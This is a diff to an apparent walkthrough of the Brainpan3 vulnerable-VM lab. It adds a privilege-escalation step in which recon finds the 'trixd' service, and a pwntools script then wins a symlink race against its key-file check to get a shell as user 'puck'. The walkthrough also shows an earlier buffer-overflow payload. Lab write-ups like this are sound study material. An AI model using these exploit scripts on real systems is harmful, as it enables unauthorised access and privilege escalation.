@@ -274,7 +274,7 @@ r.sendline('Y' * (4*(n_index-2) + 1) )
 ```
 
 ```
-SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
+SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
   AUTH   [Y]    REPORT [Y]    MENU   [Y]  
   --------------------------------------------------------------
 
@@ -572,7 +572,7 @@ Our plan of attack here is as follows:
 
 Our resulting testing script is below:
 
-```
+```python
 from pwn import * # pip install --upgrade git+https://github.com/binjitsu/binjitsu.git
 
 shellcode = 'A' * cyclic_find('zaab') + p32(0x804a080)
@@ -627,4 +627,146 @@ And we are given our reynard shell!
 [*] Switching to interactive mode
 uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)
 ```
+
+## Step 4
+
+A little more recon shows the following cron job:
+
+```
+$ cat /etc/cron.d/*
+* * * * * root cd /opt/.messenger; for i in *.msg; do /usr/local/bin/msg_admin 1 $i; rm -f $i; done
+```
+
+Looking at the privileges of `/opt/.messenger` we see the following:
+
+```
+$ ls -la /opt
+total 12
+drwxr-xr-x  3 root root 4096 May 19 23:51 .
+drwxr-xr-x 21 root root 4096 Jun 17 22:05 ..
+drwxrwx---  3 root dev  4096 Jun 10 22:32 .messenger
+```
+
+Examining the tail of `/etc/passwd`, we see `puck`. Looking at his `id`:
+
+```
+$ id puck
+uid=1001(puck) gid=1001(puck) groups=1001(puck),1004(dev)
+```
+
+He does have `dev` privileges allowing him to access `/opt/.messenger`. Let's take a look at what `puck` has on the box.
+
+```
+$ cd /home/puck
+$ ls -la
+total 12
+drwxrwx--- 2 reynard dev     4096 Jun 17 22:11 .
+drwxr-xr-x 3 root    root    4096 May 19 23:35 ..
+-rw-r--r-- 1 reynard reynard   21 Jun 17 22:11 key.txt
+$ cat key.txt
+9H37B81HZYY8912HBU93
+```
+
+Are there other keys on the box?
+
+```
+$ find / -name key* 2>/dev/null
+/nt/usb/key.txt
+$ cat /mnt/usb/key.txt
+9H37B81HZYY8912HBU93
+```
+
+Not sure what these keys are for. Looking at the `netstat` we see another service is active:
+
+```
+$ netstat -antop | grep LIST
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -                off (0.00/0/0)
+tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -                off (0.00/0/0)
+tcp        0      0 127.0.0.1:7075          0.0.0.0:*               LISTEN      -                off (0.00/0/0)
+```
+
+Connecting to it
+
+```
+$ nc localhost 7075
+Incorrect key
+```
+
+Not having any idea what service this is coming from, let's perform a system wide `strings` to try and find the binary responsible for this.
+
+```
+$ find / -executable > exes
+$ for f in $(cat exes); do echo $f >> output; strings $f | grep "Incorrect key" >> output; done
+$ grep Incorrect output -B1
+/usr/local/sbin/trixd
+Incorrect key
+```
+
+And to confirm
+
+```
+$ strings /usr/local/sbin/trixd | grep Incorrect
+Incorrect key
+```
+
+Loading `trixd` into IDA we see that the binary is checking to see if `/mnt/usb/key.txt` is a symlink, and if so, exits immediately. From here, it opens both `/mnt/usb/key.txt` and `/home/puck/key.txt` and checks if they are both the same. If they are the same, we are given a `/bin/sh` shell. Otherwise, we see the `Incorrect key` message.
+
+The idea to beat this is to connect, delete `/mnt/usb/key.txt`, then symlink `/home/puck/key.txt` to `/mnt/usb/key.txt`. If timed correctly, we will catch the symlink after the check, bypassing it.
+
+I couldn't get `binjitsu` on the Brainpan3 box (or didn't try hard enough), so we can use standard library functions to do the connections.
+
+Again, in order to make this work via one script, we will write a script to disk and execute it in order to get our shell with `puck`.
+
+Our new code is below:
+
+```python
+# Create our script on the server
+
+r.sendline(""" echo "
+import os
+import socket
+import telnetlib
+import subprocess
+
+HOST = 'localhost'
+PORT = 7075
+
+try:
+    os.remove('/mnt/usb/key.txt')
+except:
+    pass
+
+# Ensure we have a file to begin with
+subprocess.check_output(['touch', '/mnt/usb/key.txt'])
+
+# Connect and check for symlink
+r = socket.socket()
+r.connect((HOST, PORT))
+
+# Quickly remove the non-symlinked file and re-symlink
+os.remove('/mnt/usb/key.txt')
+os.symlink('/home/puck/key.txt', '/mnt/usb/key.txt')
+
+# Try for our shellz
+t = telnetlib.Telnet()
+t.sock = r
+t.interact()
+
+r.close()
+" > win.py
+""")
+
+r.sendline("python win.py")
+r.clean()
+r.sendline("whoami")
+output = r.recv()
+log.success("Shell received: {}".format(output))
+sleep(1)
+
+r.interactive()
+```
+
+
 
